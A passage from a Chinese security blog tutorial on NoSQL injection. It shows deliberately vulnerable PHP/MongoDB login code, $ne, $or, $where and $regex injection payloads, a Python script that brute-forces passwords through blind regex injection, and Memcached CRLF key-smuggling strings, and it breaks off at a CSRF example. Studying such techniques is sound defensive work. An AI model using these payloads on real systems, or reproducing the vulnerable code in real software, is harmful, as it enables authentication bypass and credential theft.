<!DOCTYPE html>


<html lang="zh-CN">


<head>
  <meta charset="utf-8" />
    
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <title>
    NoSql数据库getShell利用方法 |  Time
  </title>
  <meta name="generator" content="hexo-theme-ayer">
  
  <link rel="shortcut icon" href="/favicon.ico" />
  
  
<link rel="stylesheet" href="/dist/main.css">

  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">

  
<link rel="stylesheet" href="/css/custom.css">

  
  
<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>

  
  

  

</head>

</html>

<body>
  
  <canvas width="1777" height="841" style="position: fixed; left: 0px; top: 0px; z-index: 999; pointer-events: none;"></canvas>
  
  <div id="app">
    <main class="content on">
      <section class="outer">
  <article id="post-NoSql数据库getShell利用方法" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  NoSql数据库getShell利用方法
</h1>
 

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/06/23/NoSql%E6%95%B0%E6%8D%AE%E5%BA%93getShell%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/" class="article-date">
  <time datetime="2020-06-23T07:36:16.290Z" itemprop="datePublished">2020-06-23</time>
</a>
      
      
      
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">5.3k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">22 分钟</span>
        </span>
    </span>
</div>

      
    </div>
    

    
    
    <div class="tocbot"></div>





    

    
    <div class="article-entry" itemprop="articleBody">
      
      

      
      <p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gg29h2writj31c00u0e81.jpg" alt="36"></p>
<a id="more"></a>

<h3 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h3><p>​    网络已经成为了现代社会中的第五世界，而说起网络就不得不提起数据库,数据库作为存储信息的应用软件，已经深入到了各行各业，购物、外卖、银行、游戏、出行等，可以说只要是提供服务给用户使用的软件或者网站都离不开数据库的应用。而用的最多的是关系型数据库，例如：MYSQL、MSSQL、Oracle。而本文讲解的是非关系型数据库(NoSQL)，NoSQL数据库知道的最多的可能就是MongoDB、Redis、Memcached、Cassandra，但是你们知道NoSQL数据库还有那些吗？NoSQL的注入你们了解的多吗？NoSQL数据库中有哪些数据库是可getshell的？本文就带你了解一下什么是NoSQL数据库，NoSQL数据库的注入方法及getshell的方法。</p>
<h3 id="0x01-NoSQL数据库特性"><a href="#0x01-NoSQL数据库特性" class="headerlink" title="0x01 NoSQL数据库特性"></a>0x01 NoSQL数据库特性</h3><p>​    NoSQL全称是Not Only SQL，意为不仅仅的SQL。是一种非关系型数据存储模式，它存储的不再是结构化数据，而是类型和固定的格式，以key-value键值对、列式、文档来存储。而相较于关系型数据库，非关系数据库的优点有如下几点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、快速读写</span><br><span class="line">	主要例子有Redis，由于其逻辑简单，而且纯内存操作，使得其性能非常出色，单节点每秒可以处理超过10万次读写操作。</span><br><span class="line">2、方便扩展</span><br><span class="line">	NoSQL去掉关系数据库的关系型特性，很容易横向扩展，摆脱了以往老是纵向扩展的诟病。</span><br><span class="line">3、低廉成本</span><br><span class="line">	相较于关系型数据库来说，企业级授权费用降低很多。</span><br><span class="line">4、灵活的数据类型</span><br><span class="line">	NoSQL无需事先为要存储的数据建立字段，随时可以存储自定义的数据格式。</span><br></pre></td></tr></table></figure>

<p>NoSQL数据库分类和特点如下：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggagqjf0fbj30th08yzmk.jpg" alt="image-20200630175238730"></p>
<h3 id="0x02-Nosql数据库注入"><a href="#0x02-Nosql数据库注入" class="headerlink" title="0x02 Nosql数据库注入"></a>0x02 Nosql数据库注入</h3><p>NoSQL数据库虽然不使用SQL语句，但用网上的一句话来说，有DB的地方就有injection。且NoSQL注入的危害更大，因语句是以Web应用程序的语言来注入并在服务器上执行，从而导致允许任意代码执行，所以潜在影响要大于传统的SQL注入。</p>
<p>NoSQL注入攻击流程(此图来源于owasp)</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnkiz8lkwj31ie0sedo6.jpg" alt="image-20200712015600235"></p>
<p>NoSQL注入大概分为重言式、联合查询、Javascript、盲注、背负式查询、跨域违规等，由于背负式查询和跨域违规两种方式资料太少，也没有实战环境可测试，所以着重讲解前面几种注入方式。(此处使用MongoDB数据库来进行演示)</p>
<p>准备测试数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">创建数据库</span><br><span class="line">use admin &#x2F;&#x2F;创建一个admin数据库,如果有admin数据库就选择admin数据库</span><br><span class="line">插入数据</span><br><span class="line">db.admin.insert(&#123;&#39;username&#39;:&#39;time&#39;,&#39;password&#39;:&#39;11111&#39;&#125;)&#x2F;&#x2F;默认会自动创建admin集合</span><br><span class="line">查询数据</span><br><span class="line">db.admin.find()&#x2F;&#x2F;查询所有数据</span><br><span class="line">查看所有数据库</span><br><span class="line">show dbs </span><br><span class="line">查看集合</span><br><span class="line">show collections</span><br></pre></td></tr></table></figure>

<h4 id="1、重言式"><a href="#1、重言式" class="headerlink" title="1、重言式"></a>1、重言式</h4><p>又称永真式，既在条件语句中注入代码使其表达式判定结果永远为真，从而绕过认证或访问机制。而怎么使其注入代码后让表达式判定结果永远为真，此处就不得不说一下Mongodb数据库的条件操作符了。如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$eq : &#x3D;    	&#x2F;&#x2F;匹配字段值等于指定值的文档</span><br><span class="line">$gt : &gt;		&#x2F;&#x2F;匹配字段值大于指定值的文档</span><br><span class="line">$lt : &lt;		&#x2F;&#x2F;匹配字段值小于指定值的文档</span><br><span class="line">$gte: &gt;&#x3D;	&#x2F;&#x2F;匹配字段值大于等于指定值的文档</span><br><span class="line">$lte: &lt;&#x3D;	&#x2F;&#x2F;匹配字段值小于等于指定值的文档</span><br><span class="line">$ne : !&#x3D;	&#x2F;&#x2F;匹配字段值不等于指定值的文档，包括没有这个字段的文档</span><br><span class="line">$in : in	&#x2F;&#x2F;匹配字段值等于指定数组中的任何值</span><br><span class="line">$nin: not in	&#x2F;&#x2F;字段值不在指定数组或者不存在</span><br><span class="line">$and		&#x2F;&#x2F;文档至少满足其中的一个表达式</span><br><span class="line">$or:or		&#x2F;&#x2F;文档至少满足其中的一个表达式</span><br><span class="line">$not: 		&#x2F;&#x2F;反匹配(1.3.3及以上版本),字段值不匹配表达式或者字段值不存在</span><br><span class="line">模糊查询用正则式：db.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;)</span><br></pre></td></tr></table></figure>

<p>而在重言式注入中需要用到的就是$ne，意为不等于指定值的数据查询出来，表达式ne=1，就是把数据库中除ne=1的所有值，全部查询出来。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># 连接数据库</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">"mongodb://localhost:27017"</span>);</span><br><span class="line">$uname = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$pwd = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询语句</span></span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query(<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'uname'</span> =&gt; $uname,</span><br><span class="line">    <span class="string">'pwd'</span> =&gt; $pwd</span><br><span class="line">));</span><br><span class="line"><span class="comment"># 执行语句</span></span><br><span class="line">$result = $manager-&gt;executeQuery(<span class="string">'admin.admin'</span>, $query)-&gt;toArray();</span><br><span class="line">$count = count($result);</span><br><span class="line"><span class="keyword">if</span> ($count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        $user = ((<span class="keyword">array</span>)$user);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'username:'</span> . $user[<span class="string">'uname'</span>] . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'password:'</span> . $user[<span class="string">'pwd'</span>] . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Not Found'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如图，此处输入对的账号密码查询出一条语句</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggkv7k8vhmj30nr03ot8x.jpg" alt="image-20200709174904553"></p>
<p>如果输入以下代码，则会将数据库中所有的账户密码全部查询出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.239.135&#x2F;n&#x2F;login.php?username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1</span><br><span class="line">此处$ne是把数据库中$ne等于1之外的数据都查询出来</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggkv6kn97cj30lo05qjs0.jpg" alt="image-20200709174804855"></p>
<p>如果输入username[$ne]=time&amp;password[$ne]=time111,会将账户不是time的所有数据显示。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnm5bfcgkj315e0cmq3s.jpg" alt="image-20200712025211991"></p>
<p>当用户输入username[$ne]=1&amp;password[$ne]=1的时候，程序会将用户输入的账户密码构造成以下数据带入数据库中查询。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; new MongoDB\Driver\Query(array(</span><br><span class="line">	&#39;uname&#39; &#x3D;&gt; array($ne &#x3D;&gt; 1),</span><br><span class="line">	&#39;pwd&#39; &#x3D;&gt; array($ne &#x3D;&gt; 1)</span><br><span class="line">));</span><br></pre></td></tr></table></figure>

<p>数据库中查询出用户想要的数据</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnmlultjtj314a0jk0w2.jpg" alt="image-20200712030805742"></p>
<h4 id="2、联合查询"><a href="#2、联合查询" class="headerlink" title="2、联合查询"></a>2、联合查询</h4><p>​    攻击者利用一个脆弱的参数去改变给定查询返回的数据集，最常用的用法是绕过认证页面获取数据。比如通过增加永真式的表达式利用布尔的OR运算符导致整个语句判定出错。(因没有找到测试环境，此处大概讲一下注入方式)</p>
<p>小栗子：登录代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string query &#x3D; &quot;&#123; username:&#39;&quot; + post_username + &quot;&#39;, password:&#39;&quot; + post_passport + &#39; &quot; &#125;&quot;</span><br></pre></td></tr></table></figure>

<p>当我们登录账户时，正确的查询语句如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;‘username’:&#39;time&#39;,‘password’:&#39;time111&#39;&#125;</span><br></pre></td></tr></table></figure>

<p>如果构造一个恶意代码来忽略密码，那么就可以无需密码的情况下登录用户账号。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;time&#39;,$or:[&#123;&#125;,&#123;&#39;a&#39;:&#39;a&amp;password&#x3D;&#39;&#125;]</span><br><span class="line"></span><br><span class="line">构造的恶意语句</span><br><span class="line">&#123;&#39;username&#39;:&#39;time&#39;, &#39;$or&#39;:[&#123;&#125;,&#123;&#39;a&#39;:&#39;a&#39;,&#39;password&#39;:&#39;&#39;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>当将恶意语句带入数据库查询的时候匹配到当前用户的数据</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnqw0c15wj316e06i0u7.jpg" alt="image-20200712053615213"></p>
<h4 id="3、JavaScript注入"><a href="#3、JavaScript注入" class="headerlink" title="3、JavaScript注入"></a>3、JavaScript注入</h4><p>新型注入漏洞，由允许执行数据内容中的javascript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事物和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，导致非法的数据获取或篡改。而Mongodb中的$where操作符就可以用来执行Javascript语句。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$manager = <span class="keyword">new</span> MongoDB\Driver\Manager(<span class="string">"mongodb://localhost:27017"</span>);</span><br><span class="line">$query_body =<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'$where'</span>=&gt;<span class="string">"function q() &#123;</span></span><br><span class="line"><span class="string">	var username = "</span>.$_REQUEST[<span class="string">"username"</span>].<span class="string">";</span></span><br><span class="line"><span class="string">	var password = "</span>.$_REQUEST[<span class="string">"password"</span>].<span class="string">";if(username == 'time'&amp;&amp;password == 'time111') return true; else&#123; return false;&#125;&#125;</span></span><br><span class="line"><span class="string">"</span>);</span><br><span class="line">$query = <span class="keyword">new</span> MongoDB\Driver\Query($query_body);</span><br><span class="line">$cursor = $manager-&gt;executeQuery(<span class="string">'test.test'</span>, $query)-&gt;toArray();</span><br><span class="line"><span class="keyword">if</span>(count($cursor)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"no"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当不知道账号密码的时候，在地址栏随意输入字符，页面返回错误</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggl8tuedj8j31p00cqwfi.jpg" alt="image-20200710014015410"></p>
<p>当在参数后加上;return true;时页面返回ok</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggl8uvx2vsj31uc094wff.jpg" alt="image-20200710014115770"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload：username&#x3D;1&amp;password&#x3D;1;return ture;</span><br><span class="line"></span><br><span class="line">当输入return ture;程序会构造出以下语句</span><br><span class="line">&#39;$where&#39;&#x3D;&gt;&quot;function q() &#123;</span><br><span class="line">	var username &#x3D; &quot;.$_REQUEST[&quot;username&quot;].&quot;;</span><br><span class="line">	var password &#x3D; &quot;.$_REQUEST[&quot;password&quot;].&quot;;</span><br><span class="line">	&#x2F;&#x2F;在此处添加一段代码，不管用户输入什么都返回ture</span><br><span class="line">	return ture;</span><br><span class="line">	if(username &#x3D;&#x3D; &#39;time&#39;&amp;&amp;password &#x3D;&#x3D; &#39;time111&#39;) return true; else&#123; return false;&#125;&#125;</span><br><span class="line">&quot;);</span><br><span class="line">带入数据库中查询成功</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggns7rphjij31hg08i76f.jpg" alt="image-20200712062208900"></p>
<h4 id="4、盲注"><a href="#4、盲注" class="headerlink" title="4、盲注"></a>4、盲注</h4><p>NoSQL的盲注和SQL注入盲注类似，都是不返回数据，只是根据错误页面的返回来判断是否存在注入。此处我们需要用到的MongoDB的操作符来进行盲注$eq(等于)和$regex(正则匹配)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$mongo = <span class="keyword">new</span> mongoclient();</span><br><span class="line">$db = $mongo-&gt;test; <span class="comment">//选择数据库</span></span><br><span class="line">$coll = $db-&gt;users; <span class="comment">//选择集合</span></span><br><span class="line">$username = $_REQUEST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_REQUEST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (is_array($username)) &#123;</span><br><span class="line">    $data = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'username'</span>=&gt;$username);</span><br><span class="line">    $data = $coll-&gt;find($data);</span><br><span class="line">    <span class="keyword">if</span> ($data-&gt;count()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'yes'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'time no'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'time'</span>&amp;&amp;$password==<span class="string">'time111'</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'ok'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'login no'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>随意输入字符，页面返回错误</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsoj1q10j30yi05k0t8.jpg" alt="image-20200712063815493"></p>
<p>如果使用已知用户名为time，页面同样返回错误，而怎么才能确定账户是否正确，此时需要借助操作符$eq+burp，可以帮我们快速查找正确的账户。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnspqotjaj312c062t99.jpg" alt="image-20200712063925476"></p>
<p>首先找一个字典，由于我本地环境，所以用了四个账户测试。抓包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：username[$eq]&#x3D;§1111§&amp;password&#x3D;111</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsx0ojetj31cw0qmjva.jpg" alt="image-20200712064625094"></p>
<p>设置字典</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsy1hlnlj30s20ik764.jpg" alt="image-20200712064724308"></p>
<p>可以看见，跑出两个正确的用户名。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnsz0t6h2j31920sydj3.jpg" alt="image-20200712064820187"></p>
<p>当确定了账号后，密码则使用正则匹配$regex来获取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;判断密码长度</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;.&#123;7&#125;</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;t.&#123;6&#125;</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;ti.&#123;5&#125;</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.3&#x2F;news.php?username[$eq]&#x3D;time&amp;password[$regex]&#x3D;tim.&#123;4&#125;</span><br><span class="line">以此类推</span><br><span class="line">数据库中查询语句会使用$regex和^</span><br><span class="line">&#123;&#39;username&#39;:&#123;&#39;$eq&#39;:&#39;time&#39;&#125;,&#39;password&#39;:&#123;&#39;$regex&#39;:&#39;^&#39;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggntbiy2e8j316g08a40m.jpg" alt="image-20200712070021751"></p>
<p>而密码就有些复杂了，不能使用burp，不过可以借助脚本来测试。</p>
<p>脚本:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib3</span><br><span class="line">import string</span><br><span class="line">import urllib</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line">username &#x3D; &#39;admin&#39;</span><br><span class="line">password &#x3D; &#39;&#39;</span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;mongo&#x2F;test.php&#39;</span><br><span class="line">while True:</span><br><span class="line">    for c in string.printable:</span><br><span class="line">        if c not in [&#39;*&#39;, &#39;+&#39;, &#39;.&#39;, &#39;?&#39;, &#39;|&#39;, &#39;#&#39;, &#39;&amp;&#39;, &#39;$&#39;]:</span><br><span class="line">            payload &#x3D; &#39;?username&#x3D;%s&amp;password[$regex]&#x3D;^%s&#39; % (username, password + c)</span><br><span class="line">            r &#x3D; requests.get(target + payload)</span><br><span class="line">            if &#39;OK&#39; in r.text:</span><br><span class="line">                print(&quot;Found one more char : %s&quot; % (password+c))</span><br><span class="line">                password +&#x3D; c</span><br></pre></td></tr></table></figure>

<h4 id="5、背负式查询"><a href="#5、背负式查询" class="headerlink" title="5、背负式查询"></a>5、背负式查询</h4><p> 背负式查询是Memcached数据库的的一种注入，在php5.5的时候该漏洞被修复，由于网上资料较少，所以此处在网上摘抄了一部分作为了解。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set &lt;KEY&gt; &lt;FLAG&gt; &lt;EXPIRE_TIME&gt;   &lt;LENGTH&gt;,</span><br></pre></td></tr></table></figure>

<p>当PHP配置的函数被调用时，接收参数如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$memcached-&gt;set(&#39;key&#39;, &#39;value&#39;);</span><br></pre></td></tr></table></figure>

<p>该驱动程序未能针对带有回车\r(0x0D)和换行的\n(0x0A)的ASCII码采取措施,导致攻击者有机会注入包含有键参数的新命令行和其他非计划内的命令到缓存中8。如下代码,其中的$param是用户输入并作为键来作用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$memcached&#x3D;new Memcached(); $memcached -&gt;addServer(&#39;localhost&#39;,11211); $memcached-&gt;set($param, &quot;some value&quot;);</span><br></pre></td></tr></table></figure>

<p>攻击者可以提供以下输入进行注入攻击：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;key1 0 3600 4\r\nabcd\r\nset key2 0 3600 4\r\ninject\r\n&quot;</span><br></pre></td></tr></table></figure>

<p>增加到数据库中的第一个键是具有”some value”值的key1。攻击者可以增加其他的、非计划内的键到数据库中,即带有”inject”值的key2。这种注入也可以发生在get命令上。看一下Memcached主页上的示例,它以这三行开头：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function get_foo(foo_id) foo &#x3D; memcached_get(&quot;foo: &quot; . foo_id) return foo if defined foo</span><br></pre></td></tr></table></figure>

<p>这个示例展示了Memcached的典型用法,在处理输入之前首先检查在数据库中是不是已经存在了。假设用类似代码检查从用户那里接收的认证令牌,验证他们是不是登录过了,那么就可以通过传递以下作为令牌的字符串来利用它:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;random_token\r\nset my_crafted_token 0 3600 4\r\nroot\r\n&quot;</span><br></pre></td></tr></table></figure>

<p>当这个字符串作为令牌传递时,数据库将检查这个”random_token”是否存在,然后将添加一个具有”root”值的”my_crafted_token”。之后,攻击者就可以发送具有root身份的my_crafted_token令牌了。<br>可以被这项技术攻击的其他指令还有：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">incr &lt;Key&gt; &lt;Amount&gt;</span><br><span class="line">decr &lt;Key&gt; &lt;Amount&gt;</span><br><span class="line">delete &lt;Key&gt;</span><br></pre></td></tr></table></figure>

<p>在此,incr用于增加一个键的值,decr用于缩减一个键的值,以及delete用于删除一个键。攻击者也可以用像set和get函数一样的手段来使用带来自己键参数的这三个函数。攻击者可以使用多条目函数进行同样的注入：deleteMulti、getMulti和setMulti,其中每一个键字段都可以被注入。回车换行注入可以被用于连接多个get请求。在一项我们进行的测试中,包括原始get在内最多可以连接17条。这样注入返回的结果是第一个键及其相应的值。</p>
<h4 id="6、跨域违规"><a href="#6、跨域违规" class="headerlink" title="6、跨域违规"></a>6、跨域违规</h4><p>NoSQL数据库的另一个常见特点是，他们能够常常暴露能够从客户端应用进行数据库查询的HTTP REST API。暴露REST API 的数据库包括MongoDB、CouchDB和HBase。暴露REST API 就直接把数据库暴露给应用了，甚至是仅基于HTML5的应用，因为它不再需要间接的驱动程序了，让任何编程语言都可以在数据库上执行HTTP查询。这么做的优势非常明显，但这一特点是否伴随着安全风险？我们的回答是肯定的：这种REST API给跨站点请求伪造（CSRF）暴露了数据库，让攻击者绕过了防火墙和其他外围防御。</p>
<p>HTTP REST APIs是NoSQL数据库中的一个流行模块，然而，它们引入了一类新的漏洞，它甚至能让攻击者从其他域攻击数据库。在跨域攻击中，攻击者利用合法用户和他们的网页浏览器执行有害的操作。是一种跨站请求伪造（CSRF）攻击形式的违规行为，在此网站信任的用户浏览器将被利用在NoSQL数据库上执行非法操作。通过把HTML格式的代码注入到有漏洞的网站或者欺骗用户进入到攻击者自己的网站上，攻击者可以在目标数据库上执行post动作，从而破坏数据库。</p>
<p>现在让我们看看CSRF攻击是如何使用这个函数增加新文件到管理员集合中的，从而在hr数据库（它被认为处于安全的内部网络中）中增加了一个新的管理员用户，如图5所示。若想攻击成功，必须要满足几个条件。首先，攻击者必须能操作一个网站，要么是他们自己的网站，要么是利用不安全的网站。攻击在该网站放置一个HTML表单以及一段将自动提交该表单的脚本，比如：</p>
